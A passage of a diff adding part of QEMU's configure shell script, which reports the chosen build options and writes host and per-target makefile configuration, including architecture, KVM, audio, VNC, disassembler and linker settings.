+echo "Host C compiler   $host_cc"
+echo "CFLAGS            $CFLAGS"
+echo "QEMU_CFLAGS       $QEMU_CFLAGS"
+echo "LDFLAGS           $LDFLAGS"
+echo "make              $make"
+echo "install           $install"
+echo "host CPU          $cpu"
+echo "host big endian   $bigendian"
+echo "target list       $target_list"
+echo "tcg debug enabled $debug_tcg"
+echo "Mon debug enabled $debug_mon"
+echo "gprof enabled     $gprof"
+echo "sparse enabled    $sparse"
+echo "strip binaries    $strip_opt"
+echo "profiler          $profiler"
+echo "static build      $static"
+echo "-Werror enabled   $werror"
+if test "$darwin" = "yes" ; then
+    echo "Cocoa support     $cocoa"
+fi
+echo "SDL support       $sdl"
+echo "curses support    $curses"
+echo "curl support      $curl"
+echo "check support     $check_utests"
+echo "mingw32 support   $mingw32"
+echo "Audio drivers     $audio_drv_list"
+echo "Extra audio cards $audio_card_list"
+echo "Block whitelist   $block_drv_whitelist"
+echo "Mixer emulation   $mixemu"
+echo "VNC TLS support   $vnc_tls"
+echo "VNC SASL support  $vnc_sasl"
+echo "VNC JPEG support  $vnc_jpeg"
+echo "VNC PNG support   $vnc_png"
+echo "VNC thread        $vnc_thread"
+if test -n "$sparc_cpu"; then
+    echo "Target Sparc Arch $sparc_cpu"
+fi
+echo "xen support       $xen"
+echo "CPU emulation     $cpu_emulation"
+echo "brlapi support    $brlapi"
+echo "bluez  support    $bluez"
+echo "Documentation     $docs"
+[ ! -z "$uname_release" ] && \
+echo "uname -r          $uname_release"
+echo "NPTL support      $nptl"
+echo "GUEST_BASE        $guest_base"
+echo "PIE user targets  $user_pie"
+echo "vde support       $vde"
+echo "IO thread         $io_thread"
+echo "Linux AIO support $linux_aio"
+echo "ATTR/XATTR support $attr"
+echo "Install blobs     $blobs"
+echo "KVM support       $kvm"
+echo "KVM PIT support   $kvm_cap_pit"
+echo "KVM device assig. $kvm_cap_device_assignment"
+echo "fdt support       $fdt"
+echo "preadv support    $preadv"
+echo "fdatasync         $fdatasync"
+echo "madvise           $madvise"
+echo "posix_madvise     $posix_madvise"
+echo "uuid support      $uuid"
+echo "vhost-net support $vhost_net"
+echo "Trace backend     $trace_backend"
+echo "Trace output file $trace_file-<pid>"
+echo "spice support     $spice"
+echo "rbd support       $rbd"
+echo "xfsctl support    $xfs"
+
+if test $sdl_too_old = "yes"; then
+echo "-> Your SDL version is too old - please upgrade to have SDL support"
+fi
+
+config_host_mak="config-host.mak"
+config_host_ld="config-host.ld"
+
+echo "# Automatically generated by configure - do not modify" > $config_host_mak
+printf "# Configured with:" >> $config_host_mak
+printf " '%s'" "$0" "$@" >> $config_host_mak
+echo >> $config_host_mak
+
+echo all: >> $config_host_mak
+echo "prefix=$prefix" >> $config_host_mak
+echo "bindir=$bindir" >> $config_host_mak
+echo "mandir=$mandir" >> $config_host_mak
+echo "datadir=$datadir" >> $config_host_mak
+echo "sysconfdir=$sysconfdir" >> $config_host_mak
+echo "docdir=$docdir" >> $config_host_mak
+echo "confdir=$confdir" >> $config_host_mak
+
+case "$cpu" in
+  i386|x86_64|alpha|cris|hppa|ia64|m68k|microblaze|mips|mips64|ppc|ppc64|s390|s390x|sparc|sparc64)
+    ARCH=$cpu
+  ;;
+  armv4b|armv4l)
+    ARCH=arm
+  ;;
+esac
+echo "ARCH=$ARCH" >> $config_host_mak
+if test "$debug_tcg" = "yes" ; then
+  echo "CONFIG_DEBUG_TCG=y" >> $config_host_mak
+fi
+if test "$debug_mon" = "yes" ; then
+  echo "CONFIG_DEBUG_MONITOR=y" >> $config_host_mak
+fi
+if test "$debug" = "yes" ; then
+  echo "CONFIG_DEBUG_EXEC=y" >> $config_host_mak
+fi
+if test "$strip_opt" = "yes" ; then
+  echo "STRIP=${strip}" >> $config_host_mak
+fi
+if test "$bigendian" = "yes" ; then
+  echo "HOST_WORDS_BIGENDIAN=y" >> $config_host_mak
+fi
+echo "HOST_LONG_BITS=$hostlongbits" >> $config_host_mak
+if test "$mingw32" = "yes" ; then
+  echo "CONFIG_WIN32=y" >> $config_host_mak
+  rc_version=`cat $source_path/VERSION`
+  version_major=${rc_version%%.*}
+  rc_version=${rc_version#*.}
+  version_minor=${rc_version%%.*}
+  rc_version=${rc_version#*.}
+  version_subminor=${rc_version%%.*}
+  version_micro=0
+  echo "CONFIG_FILEVERSION=$version_major,$version_minor,$version_subminor,$version_micro" >> $config_host_mak
+  echo "CONFIG_PRODUCTVERSION=$version_major,$version_minor,$version_subminor,$version_micro" >> $config_host_mak
+else
+  echo "CONFIG_POSIX=y" >> $config_host_mak
+fi
+
+if test "$linux" = "yes" ; then
+  echo "CONFIG_LINUX=y" >> $config_host_mak
+fi
+
+if test "$darwin" = "yes" ; then
+  echo "CONFIG_DARWIN=y" >> $config_host_mak
+fi
+
+if test "$aix" = "yes" ; then
+  echo "CONFIG_AIX=y" >> $config_host_mak
+fi
+
+if test "$solaris" = "yes" ; then
+  echo "CONFIG_SOLARIS=y" >> $config_host_mak
+  echo "CONFIG_SOLARIS_VERSION=$solarisrev" >> $config_host_mak
+  if test "$needs_libsunmath" = "yes" ; then
+    echo "CONFIG_NEEDS_LIBSUNMATH=y" >> $config_host_mak
+  fi
+fi
+if test "$haiku" = "yes" ; then
+  echo "CONFIG_HAIKU=y" >> $config_host_mak
+fi
+if test "$static" = "yes" ; then
+  echo "CONFIG_STATIC=y" >> $config_host_mak
+fi
+if test $profiler = "yes" ; then
+  echo "CONFIG_PROFILER=y" >> $config_host_mak
+fi
+if test "$slirp" = "yes" ; then
+  echo "CONFIG_SLIRP=y" >> $config_host_mak
+  QEMU_INCLUDES="-I\$(SRC_PATH)/slirp $QEMU_INCLUDES"
+fi
+if test "$vde" = "yes" ; then
+  echo "CONFIG_VDE=y" >> $config_host_mak
+fi
+for card in $audio_card_list; do
+    def=CONFIG_`echo $card | tr '[:lower:]' '[:upper:]'`
+    echo "$def=y" >> $config_host_mak
+done
+echo "CONFIG_AUDIO_DRIVERS=$audio_drv_list" >> $config_host_mak
+for drv in $audio_drv_list; do
+    def=CONFIG_`echo $drv | tr '[:lower:]' '[:upper:]'`
+    echo "$def=y" >> $config_host_mak
+    if test "$drv" = "fmod"; then
+        echo "FMOD_CFLAGS=-I$fmod_inc" >> $config_host_mak
+    fi
+done
+if test "$audio_pt_int" = "yes" ; then
+  echo "CONFIG_AUDIO_PT_INT=y" >> $config_host_mak
+fi
+if test "$audio_win_int" = "yes" ; then
+  echo "CONFIG_AUDIO_WIN_INT=y" >> $config_host_mak
+fi
+echo "CONFIG_BDRV_WHITELIST=$block_drv_whitelist" >> $config_host_mak
+if test "$mixemu" = "yes" ; then
+  echo "CONFIG_MIXEMU=y" >> $config_host_mak
+fi
+if test "$vnc_tls" = "yes" ; then
+  echo "CONFIG_VNC_TLS=y" >> $config_host_mak
+  echo "VNC_TLS_CFLAGS=$vnc_tls_cflags" >> $config_host_mak
+fi
+if test "$vnc_sasl" = "yes" ; then
+  echo "CONFIG_VNC_SASL=y" >> $config_host_mak
+  echo "VNC_SASL_CFLAGS=$vnc_sasl_cflags" >> $config_host_mak
+fi
+if test "$vnc_jpeg" != "no" ; then
+  echo "CONFIG_VNC_JPEG=y" >> $config_host_mak
+  echo "VNC_JPEG_CFLAGS=$vnc_jpeg_cflags" >> $config_host_mak
+fi
+if test "$vnc_png" != "no" ; then
+  echo "CONFIG_VNC_PNG=y" >> $config_host_mak
+  echo "VNC_PNG_CFLAGS=$vnc_png_cflags" >> $config_host_mak
+fi
+if test "$vnc_thread" != "no" ; then
+  echo "CONFIG_VNC_THREAD=y" >> $config_host_mak
+  echo "CONFIG_THREAD=y" >> $config_host_mak
+fi
+if test "$fnmatch" = "yes" ; then
+  echo "CONFIG_FNMATCH=y" >> $config_host_mak
+fi
+if test "$uuid" = "yes" ; then
+  echo "CONFIG_UUID=y" >> $config_host_mak
+fi
+if test "$xfs" = "yes" ; then
+  echo "CONFIG_XFS=y" >> $config_host_mak
+fi
+qemu_version=`head $source_path/VERSION`
+echo "VERSION=$qemu_version" >>$config_host_mak
+echo "PKGVERSION=$pkgversion" >>$config_host_mak
+echo "SRC_PATH=$source_path" >> $config_host_mak
+echo "TARGET_DIRS=$target_list" >> $config_host_mak
+if [ "$docs" = "yes" ] ; then
+  echo "BUILD_DOCS=yes" >> $config_host_mak
+fi
+if test "$sdl" = "yes" ; then
+  echo "CONFIG_SDL=y" >> $config_host_mak
+  echo "SDL_CFLAGS=$sdl_cflags" >> $config_host_mak
+fi
+if test "$cocoa" = "yes" ; then
+  echo "CONFIG_COCOA=y" >> $config_host_mak
+fi
+if test "$curses" = "yes" ; then
+  echo "CONFIG_CURSES=y" >> $config_host_mak
+fi
+if test "$atfile" = "yes" ; then
+  echo "CONFIG_ATFILE=y" >> $config_host_mak
+fi
+if test "$utimens" = "yes" ; then
+  echo "CONFIG_UTIMENSAT=y" >> $config_host_mak
+fi
+if test "$pipe2" = "yes" ; then
+  echo "CONFIG_PIPE2=y" >> $config_host_mak
+fi
+if test "$accept4" = "yes" ; then
+  echo "CONFIG_ACCEPT4=y" >> $config_host_mak
+fi
+if test "$splice" = "yes" ; then
+  echo "CONFIG_SPLICE=y" >> $config_host_mak
+fi
+if test "$eventfd" = "yes" ; then
+  echo "CONFIG_EVENTFD=y" >> $config_host_mak
+fi
+if test "$fallocate" = "yes" ; then
+  echo "CONFIG_FALLOCATE=y" >> $config_host_mak
+fi
+if test "$sync_file_range" = "yes" ; then
+  echo "CONFIG_SYNC_FILE_RANGE=y" >> $config_host_mak
+fi
+if test "$fiemap" = "yes" ; then
+  echo "CONFIG_FIEMAP=y" >> $config_host_mak
+fi
+if test "$dup3" = "yes" ; then
+  echo "CONFIG_DUP3=y" >> $config_host_mak
+fi
+if test "$inotify" = "yes" ; then
+  echo "CONFIG_INOTIFY=y" >> $config_host_mak
+fi
+if test "$inotify1" = "yes" ; then
+  echo "CONFIG_INOTIFY1=y" >> $config_host_mak
+fi
+if test "$byteswap_h" = "yes" ; then
+  echo "CONFIG_BYTESWAP_H=y" >> $config_host_mak
+fi
+if test "$bswap_h" = "yes" ; then
+  echo "CONFIG_MACHINE_BSWAP_H=y" >> $config_host_mak
+fi
+if test "$curl" = "yes" ; then
+  echo "CONFIG_CURL=y" >> $config_host_mak
+  echo "CURL_CFLAGS=$curl_cflags" >> $config_host_mak
+fi
+if test "$brlapi" = "yes" ; then
+  echo "CONFIG_BRLAPI=y" >> $config_host_mak
+fi
+if test "$bluez" = "yes" ; then
+  echo "CONFIG_BLUEZ=y" >> $config_host_mak
+  echo "BLUEZ_CFLAGS=$bluez_cflags" >> $config_host_mak
+fi
+if test "$xen" = "yes" ; then
+  echo "CONFIG_XEN=y" >> $config_host_mak
+fi
+if test "$io_thread" = "yes" ; then
+  echo "CONFIG_IOTHREAD=y" >> $config_host_mak
+  echo "CONFIG_THREAD=y" >> $config_host_mak
+fi
+if test "$linux_aio" = "yes" ; then
+  echo "CONFIG_LINUX_AIO=y" >> $config_host_mak
+fi
+if test "$attr" = "yes" ; then
+  echo "CONFIG_ATTR=y" >> $config_host_mak
+fi
+if test "$linux" = "yes" ; then
+  if test "$attr" = "yes" ; then
+    echo "CONFIG_VIRTFS=y" >> $config_host_mak
+  fi
+fi
+if test "$blobs" = "yes" ; then
+  echo "INSTALL_BLOBS=yes" >> $config_host_mak
+fi
+if test "$iovec" = "yes" ; then
+  echo "CONFIG_IOVEC=y" >> $config_host_mak
+fi
+if test "$preadv" = "yes" ; then
+  echo "CONFIG_PREADV=y" >> $config_host_mak
+fi
+if test "$fdt" = "yes" ; then
+  echo "CONFIG_FDT=y" >> $config_host_mak
+fi
+if test "$signalfd" = "yes" ; then
+  echo "CONFIG_SIGNALFD=y" >> $config_host_mak
+fi
+if test "$need_offsetof" = "yes" ; then
+  echo "CONFIG_NEED_OFFSETOF=y" >> $config_host_mak
+fi
+if test "$gcc_attribute_warn_unused_result" = "yes" ; then
+  echo "CONFIG_GCC_ATTRIBUTE_WARN_UNUSED_RESULT=y" >> $config_host_mak
+fi
+if test "$fdatasync" = "yes" ; then
+  echo "CONFIG_FDATASYNC=y" >> $config_host_mak
+fi
+if test $cpu_emulation = "yes"; then
+  echo "CONFIG_CPU_EMULATION=y" >> $config_host_mak
+else
+  echo "CONFIG_NO_CPU_EMULATION=y" >> $config_host_mak
+fi
+if test "$madvise" = "yes" ; then
+  echo "CONFIG_MADVISE=y" >> $config_host_mak
+fi
+if test "$posix_madvise" = "yes" ; then
+  echo "CONFIG_POSIX_MADVISE=y" >> $config_host_mak
+fi
+
+if test "$spice" = "yes" ; then
+  echo "CONFIG_SPICE=y" >> $config_host_mak
+fi
+
+# XXX: suppress that
+if [ "$bsd" = "yes" ] ; then
+  echo "CONFIG_BSD=y" >> $config_host_mak
+fi
+
+echo "CONFIG_UNAME_RELEASE=\"$uname_release\"" >> $config_host_mak
+
+if test "$zero_malloc" = "yes" ; then
+  echo "CONFIG_ZERO_MALLOC=y" >> $config_host_mak
+fi
+if test "$rbd" = "yes" ; then
+  echo "CONFIG_RBD=y" >> $config_host_mak
+fi
+
+# USB host support
+case "$usb" in
+linux)
+  echo "HOST_USB=linux" >> $config_host_mak
+;;
+bsd)
+  echo "HOST_USB=bsd" >> $config_host_mak
+;;
+*)
+  echo "HOST_USB=stub" >> $config_host_mak
+;;
+esac
+
+echo "TRACE_BACKEND=$trace_backend" >> $config_host_mak
+if test "$trace_backend" = "simple"; then
+  echo "CONFIG_SIMPLE_TRACE=y" >> $config_host_mak
+fi
+# Set the appropriate trace file.
+if test "$trace_backend" = "simple"; then
+  trace_file="\"$trace_file-%u\""
+fi
+if test "$trace_backend" = "dtrace" -a "$trace_backend_stap" = "yes" ; then
+  echo "CONFIG_SYSTEMTAP_TRACE=y" >> $config_host_mak
+fi
+echo "CONFIG_TRACE_FILE=$trace_file" >> $config_host_mak
+
+echo "TOOLS=$tools" >> $config_host_mak
+echo "ROMS=$roms" >> $config_host_mak
+echo "MAKE=$make" >> $config_host_mak
+echo "INSTALL=$install" >> $config_host_mak
+echo "INSTALL_DIR=$install -d -m0755 -p" >> $config_host_mak
+echo "INSTALL_DATA=$install -m0644 -p" >> $config_host_mak
+echo "INSTALL_PROG=$install -m0755 -p" >> $config_host_mak
+echo "CC=$cc" >> $config_host_mak
+echo "CC_I386=$cc_i386" >> $config_host_mak
+echo "HOST_CC=$host_cc" >> $config_host_mak
+echo "AR=$ar" >> $config_host_mak
+echo "OBJCOPY=$objcopy" >> $config_host_mak
+echo "LD=$ld" >> $config_host_mak
+echo "WINDRES=$windres" >> $config_host_mak
+echo "CFLAGS=$CFLAGS" >> $config_host_mak
+echo "QEMU_CFLAGS=$QEMU_CFLAGS" >> $config_host_mak
+echo "QEMU_INCLUDES=$QEMU_INCLUDES" >> $config_host_mak
+if test "$sparse" = "yes" ; then
+  echo "CC           := REAL_CC=\"\$(CC)\" cgcc"       >> $config_host_mak
+  echo "HOST_CC      := REAL_CC=\"\$(HOST_CC)\" cgcc"  >> $config_host_mak
+  echo "QEMU_CFLAGS  += -Wbitwise -Wno-transparent-union -Wno-old-initializer -Wno-non-pointer-null" >> $config_host_mak
+fi
+echo "HELPER_CFLAGS=$helper_cflags" >> $config_host_mak
+echo "LDFLAGS=$LDFLAGS" >> $config_host_mak
+echo "ARLIBS_BEGIN=$arlibs_begin" >> $config_host_mak
+echo "ARLIBS_END=$arlibs_end" >> $config_host_mak
+echo "LIBS+=$LIBS" >> $config_host_mak
+echo "LIBS_TOOLS+=$libs_tools" >> $config_host_mak
+echo "EXESUF=$EXESUF" >> $config_host_mak
+
+# generate list of library paths for linker script
+
+$ld --verbose -v 2> /dev/null | grep SEARCH_DIR > ${config_host_ld}
+
+if test -f ${config_host_ld}~ ; then
+  if cmp -s $config_host_ld ${config_host_ld}~ ; then
+    mv ${config_host_ld}~ $config_host_ld
+  else
+    rm ${config_host_ld}~
+  fi
+fi
+
+for d in libdis libdis-user; do
+    mkdir -p $d
+    symlink $source_path/Makefile.dis $d/Makefile
+    echo > $d/config.mak
+done
+if test "$static" = "no" -a "$user_pie" = "yes" ; then
+  echo "QEMU_CFLAGS+=-fpie" > libdis-user/config.mak
+fi
+
+for target in $target_list; do
+target_dir="$target"
+config_target_mak=$target_dir/config-target.mak
+target_arch2=`echo $target | cut -d '-' -f 1`
+target_bigendian="no"
+
+case "$target_arch2" in
+  armeb|m68k|microblaze|mips|mipsn32|mips64|ppc|ppcemb|ppc64|ppc64abi32|s390x|sh4eb|sparc|sparc64|sparc32plus)
+  target_bigendian=yes
+  ;;
+esac
+target_softmmu="no"
+target_user_only="no"
+target_linux_user="no"
+target_darwin_user="no"
+target_bsd_user="no"
+case "$target" in
+  ${target_arch2}-softmmu)
+    target_softmmu="yes"
+    ;;
+  ${target_arch2}-linux-user)
+    if test "$linux" != "yes" ; then
+      echo "ERROR: Target '$target' is only available on a Linux host"
+      exit 1
+    fi
+    target_user_only="yes"
+    target_linux_user="yes"
+    ;;
+  ${target_arch2}-darwin-user)
+    if test "$darwin" != "yes" ; then
+      echo "ERROR: Target '$target' is only available on a Darwin host"
+      exit 1
+    fi
+    target_user_only="yes"
+    target_darwin_user="yes"
+    ;;
+  ${target_arch2}-bsd-user)
+    if test "$bsd" != "yes" ; then
+      echo "ERROR: Target '$target' is only available on a BSD host"
+      exit 1
+    fi
+    target_user_only="yes"
+    target_bsd_user="yes"
+    ;;
+  *)
+    echo "ERROR: Target '$target' not recognised"
+    exit 1
+    ;;
+esac
+
+mkdir -p $target_dir
+mkdir -p $target_dir/fpu
+mkdir -p $target_dir/tcg
+mkdir -p $target_dir/ide
+if test "$target" = "arm-linux-user" -o "$target" = "armeb-linux-user" -o "$target" = "arm-bsd-user" -o "$target" = "armeb-bsd-user" ; then
+  mkdir -p $target_dir/nwfpe
+fi
+symlink $source_path/Makefile.target $target_dir/Makefile
+
+
+echo "# Automatically generated by configure - do not modify" > $config_target_mak
+
+bflt="no"
+target_nptl="no"
+interp_prefix1=`echo "$interp_prefix" | sed "s/%M/$target_arch2/g"`
+echo "CONFIG_QEMU_INTERP_PREFIX=\"$interp_prefix1\"" >> $config_target_mak
+gdb_xml_files=""
+
+TARGET_ARCH="$target_arch2"
+TARGET_BASE_ARCH=""
+TARGET_ABI_DIR=""
+
+case "$target_arch2" in
+  i386)
+    target_phys_bits=32
+  ;;
+  x86_64)
+    TARGET_BASE_ARCH=i386
+    target_phys_bits=64
+  ;;
+  ia64)
+    target_phys_bits=64
+  ;;
+  alpha)
+    target_phys_bits=64
+    target_nptl="yes"
+  ;;
+  arm|armeb)
+    TARGET_ARCH=arm
+    bflt="yes"
+    target_nptl="yes"
+    gdb_xml_files="arm-core.xml arm-vfp.xml arm-vfp3.xml arm-neon.xml"
+    target_phys_bits=32
+  ;;
+  cris)
+    target_nptl="yes"
+    target_phys_bits=32
+  ;;
+  m68k)
+    bflt="yes"
+    gdb_xml_files="cf-core.xml cf-fp.xml"
+    target_phys_bits=32
+  ;;
+  microblaze)
+    bflt="yes"
+    target_nptl="yes"
+    target_phys_bits=32
+  ;;
+  mips|mipsel)
+    TARGET_ARCH=mips
+    echo "TARGET_ABI_MIPSO32=y" >> $config_target_mak
+    target_nptl="yes"
+    target_phys_bits=64
+  ;;
+  mipsn32|mipsn32el)
+    TARGET_ARCH=mipsn32
+    TARGET_BASE_ARCH=mips
+    echo "TARGET_ABI_MIPSN32=y" >> $config_target_mak
+    target_phys_bits=64
+  ;;
+  mips64|mips64el)
+    TARGET_ARCH=mips64
+    TARGET_BASE_ARCH=mips
+    echo "TARGET_ABI_MIPSN64=y" >> $config_target_mak
+    target_phys_bits=64
+  ;;
+  ppc)
+    gdb_xml_files="power-core.xml power-fpu.xml power-altivec.xml power-spe.xml"
+    target_phys_bits=32
+    target_nptl="yes"
+  ;;
+  ppcemb)
+    TARGET_BASE_ARCH=ppc
+    TARGET_ABI_DIR=ppc
+    gdb_xml_files="power-core.xml power-fpu.xml power-altivec.xml power-spe.xml"
+    target_phys_bits=64
+    target_nptl="yes"
+  ;;
+  ppc64)
+    TARGET_BASE_ARCH=ppc
+    TARGET_ABI_DIR=ppc
+    gdb_xml_files="power64-core.xml power-fpu.xml power-altivec.xml power-spe.xml"
+    target_phys_bits=64
+  ;;
+  ppc64abi32)
+    TARGET_ARCH=ppc64
+    TARGET_BASE_ARCH=ppc
+    TARGET_ABI_DIR=ppc
+    echo "TARGET_ABI32=y" >> $config_target_mak
+    gdb_xml_files="power64-core.xml power-fpu.xml power-altivec.xml power-spe.xml"
+    target_phys_bits=64
+  ;;
+  sh4|sh4eb)
+    TARGET_ARCH=sh4
+    bflt="yes"
+    target_nptl="yes"
+    target_phys_bits=32
+  ;;
+  sparc)
+    target_phys_bits=64
+  ;;
+  sparc64)
+    TARGET_BASE_ARCH=sparc
+    target_phys_bits=64
+  ;;
+  sparc32plus)
+    TARGET_ARCH=sparc64
+    TARGET_BASE_ARCH=sparc
+    TARGET_ABI_DIR=sparc
+    echo "TARGET_ABI32=y" >> $config_target_mak
+    target_phys_bits=64
+  ;;
+  s390x)
+    target_phys_bits=64
+  ;;
+  *)
+    echo "Unsupported target CPU"
+    exit 1
+  ;;
+esac
+echo "TARGET_ARCH=$TARGET_ARCH" >> $config_target_mak
+target_arch_name="`echo $TARGET_ARCH | tr '[:lower:]' '[:upper:]'`"
+echo "TARGET_$target_arch_name=y" >> $config_target_mak
+echo "TARGET_ARCH2=$target_arch2" >> $config_target_mak
+# TARGET_BASE_ARCH needs to be defined after TARGET_ARCH
+if [ "$TARGET_BASE_ARCH" = "" ]; then
+  TARGET_BASE_ARCH=$TARGET_ARCH
+fi
+echo "TARGET_BASE_ARCH=$TARGET_BASE_ARCH" >> $config_target_mak
+if [ "$TARGET_ABI_DIR" = "" ]; then
+  TARGET_ABI_DIR=$TARGET_ARCH
+fi
+echo "TARGET_ABI_DIR=$TARGET_ABI_DIR" >> $config_target_mak
+case "$target_arch2" in
+  i386|x86_64)
+    if test "$xen" = "yes" -a "$target_softmmu" = "yes" ; then
+      echo "CONFIG_XEN=y" >> $config_target_mak
+    fi
+esac
+case "$target_arch2" in
+  i386|x86_64|ppcemb|ppc|ppc64|s390x)
+    # Make sure the target and host cpus are compatible
+    if test "$kvm" = "yes" -a "$target_softmmu" = "yes" -a \
+      \( "$target_arch2" = "$cpu" -o \
+      \( "$target_arch2" = "ppcemb" -a "$cpu" = "ppc" \) -o \
+      \( "$target_arch2" = "ppc64"  -a "$cpu" = "ppc" \) -o \
+      \( "$target_arch2" = "x86_64" -a "$cpu" = "i386"   \) -o \
+      \( "$target_arch2" = "i386"   -a "$cpu" = "x86_64" \) \) ; then
+      echo "CONFIG_KVM=y" >> $config_target_mak
+      echo "KVM_CFLAGS=$kvm_cflags" >> $config_target_mak
+      if test "$kvm_para" = "yes"; then
+        echo "CONFIG_KVM_PARA=y" >> $config_target_mak
+      fi
+      if test $kvm_cap_pit = "yes" ; then
+        echo "CONFIG_KVM_PIT=y" >> $config_target_mak
+      fi
+      if test $kvm_cap_device_assignment = "yes" ; then
+        echo "CONFIG_KVM_DEVICE_ASSIGNMENT=y" >> $config_target_mak
+      fi
+      if test $vhost_net = "yes" ; then
+        echo "CONFIG_VHOST_NET=y" >> $config_target_mak
+      fi
+    fi
+esac
+if test "$target_bigendian" = "yes" ; then
+  echo "TARGET_WORDS_BIGENDIAN=y" >> $config_target_mak
+fi
+if test "$target_softmmu" = "yes" ; then
+  echo "TARGET_PHYS_ADDR_BITS=$target_phys_bits" >> $config_target_mak
+  echo "CONFIG_SOFTMMU=y" >> $config_target_mak
+  echo "LIBS+=$libs_softmmu" >> $config_target_mak
+  echo "HWDIR=../libhw$target_phys_bits" >> $config_target_mak
+  echo "subdir-$target: subdir-libhw$target_phys_bits" >> $config_host_mak
+fi
+if test "$target_user_only" = "yes" ; then
+  echo "CONFIG_USER_ONLY=y" >> $config_target_mak
+fi
+if test "$target_linux_user" = "yes" ; then
+  echo "CONFIG_LINUX_USER=y" >> $config_target_mak
+fi
+if test "$target_darwin_user" = "yes" ; then
+  echo "CONFIG_DARWIN_USER=y" >> $config_target_mak
+fi
+list=""
+if test ! -z "$gdb_xml_files" ; then
+  for x in $gdb_xml_files; do
+    list="$list $source_path/gdb-xml/$x"
+  done
+  echo "TARGET_XML_FILES=$list" >> $config_target_mak
+fi
+
+case "$target_arch2" in
+  i386|x86_64)
+    echo "CONFIG_NOSOFTFLOAT=y" >> $config_target_mak
+    ;;
+  *)
+    echo "CONFIG_SOFTFLOAT=y" >> $config_target_mak
+    ;;
+esac
+
+if test "$target_user_only" = "yes" -a "$bflt" = "yes"; then
+  echo "TARGET_HAS_BFLT=y" >> $config_target_mak
+fi
+if test "$target_user_only" = "yes" \
+        -a "$nptl" = "yes" -a "$target_nptl" = "yes"; then
+  echo "CONFIG_USE_NPTL=y" >> $config_target_mak
+fi
+if test "$target_user_only" = "yes" -a "$guest_base" = "yes"; then
+  echo "CONFIG_USE_GUEST_BASE=y" >> $config_target_mak
+fi
+if test "$target_bsd_user" = "yes" ; then
+  echo "CONFIG_BSD_USER=y" >> $config_target_mak
+fi
+
+# generate QEMU_CFLAGS/LDFLAGS for targets
+
+cflags=""
+includes=""
+ldflags=""
+
+if test "$ARCH" = "sparc64" ; then
+  includes="-I\$(SRC_PATH)/tcg/sparc $includes"
+elif test "$ARCH" = "s390x" ; then
+  includes="-I\$(SRC_PATH)/tcg/s390 $includes"
+elif test "$ARCH" = "x86_64" ; then
+  includes="-I\$(SRC_PATH)/tcg/i386 $includes"
+else
+  includes="-I\$(SRC_PATH)/tcg/\$(ARCH) $includes"
+fi
+includes="-I\$(SRC_PATH)/tcg $includes"
+includes="-I\$(SRC_PATH)/fpu $includes"
+
+if test "$target_user_only" = "yes" ; then
+    libdis_config_mak=libdis-user/config.mak
+else
+    libdis_config_mak=libdis/config.mak
+fi
+
+for i in $ARCH $TARGET_BASE_ARCH ; do
+  case "$i" in
+  alpha)
+    echo "CONFIG_ALPHA_DIS=y"  >> $config_target_mak
+    echo "CONFIG_ALPHA_DIS=y"  >> $libdis_config_mak
+  ;;
+  arm)
+    echo "CONFIG_ARM_DIS=y"  >> $config_target_mak
+    echo "CONFIG_ARM_DIS=y"  >> $libdis_config_mak
+  ;;
+  cris)
+    echo "CONFIG_CRIS_DIS=y"  >> $config_target_mak
+    echo "CONFIG_CRIS_DIS=y"  >> $libdis_config_mak
+  ;;
+  hppa)
+    echo "CONFIG_HPPA_DIS=y"  >> $config_target_mak
+    echo "CONFIG_HPPA_DIS=y"  >> $libdis_config_mak
+  ;;
+  i386|x86_64)
+    echo "CONFIG_I386_DIS=y"  >> $config_target_mak
+    echo "CONFIG_I386_DIS=y"  >> $libdis_config_mak
+  ;;
+  ia64*)
+    echo "CONFIG_IA64_DIS=y"  >> $config_target_mak
+    echo "CONFIG_IA64_DIS=y"  >> $libdis_config_mak
+  ;;
+  m68k)
+    echo "CONFIG_M68K_DIS=y"  >> $config_target_mak
+    echo "CONFIG_M68K_DIS=y"  >> $libdis_config_mak
+  ;;
+  microblaze)
+    echo "CONFIG_MICROBLAZE_DIS=y"  >> $config_target_mak
+    echo "CONFIG_MICROBLAZE_DIS=y"  >> $libdis_config_mak
+  ;;
+  mips*)
+    echo "CONFIG_MIPS_DIS=y"  >> $config_target_mak
+    echo "CONFIG_MIPS_DIS=y"  >> $libdis_config_mak
+  ;;
+  ppc*)
+    echo "CONFIG_PPC_DIS=y"  >> $config_target_mak
+    echo "CONFIG_PPC_DIS=y"  >> $libdis_config_mak
+  ;;
+  s390*)
+    echo "CONFIG_S390_DIS=y"  >> $config_target_mak
+    echo "CONFIG_S390_DIS=y"  >> $libdis_config_mak
+  ;;
+  sh4)
+    echo "CONFIG_SH4_DIS=y"  >> $config_target_mak
+    echo "CONFIG_SH4_DIS=y"  >> $libdis_config_mak
+  ;;
+  sparc*)
+    echo "CONFIG_SPARC_DIS=y"  >> $config_target_mak
+    echo "CONFIG_SPARC_DIS=y"  >> $libdis_config_mak
+  ;;
+  esac
+done
+
+case "$ARCH" in
+alpha)
+  # Ensure there's only a single GP
+  cflags="-msmall-data $cflags"
+;;
+esac
+
+if test "$target_softmmu" = "yes" ; then
+  case "$TARGET_BASE_ARCH" in
+  arm)
+    cflags="-DHAS_AUDIO $cflags"
+  ;;
+  i386|mips|ppc)
+    cflags="-DHAS_AUDIO -DHAS_AUDIO_CHOICE $cflags"
+  ;;
+  esac
+fi
+
+if test "$target_user_only" = "yes" -a "$static" = "no" -a \
+	"$user_pie" = "yes" ; then
+  cflags="-fpie $cflags"
+  ldflags="-pie $ldflags"
+fi
+
+if test "$target_softmmu" = "yes" -a \( \
+        "$TARGET_ARCH" = "microblaze" -o \
+        "$TARGET_ARCH" = "cris" \) ; then
+  echo "CONFIG_NEED_MMU=y" >> $config_target_mak
+fi
+
+if test "$gprof" = "yes" ; then
+  echo "TARGET_GPROF=yes" >> $config_target_mak
+  if test "$target_linux_user" = "yes" ; then
+    cflags="-p $cflags"
+    ldflags="-p $ldflags"
+  fi
+  if test "$target_softmmu" = "yes" ; then
+    ldflags="-p $ldflags"
+    echo "GPROF_CFLAGS=-p" >> $config_target_mak
+  fi
+fi
+
+linker_script="-Wl,-T../config-host.ld -Wl,-T,\$(SRC_PATH)/\$(ARCH).ld"
+if test "$target_linux_user" = "yes" -o "$target_bsd_user" = "yes" ; then
+  case "$ARCH" in
+  sparc)
+    # -static is used to avoid g1/g3 usage by the dynamic linker
+    ldflags="$linker_script -static $ldflags"
+    ;;
+  alpha | s390x)
+    # The default placement of the application is fine.
+    ;;
+  *)
+    ldflags="$linker_script $ldflags"
+    ;;
+  esac
+fi
+
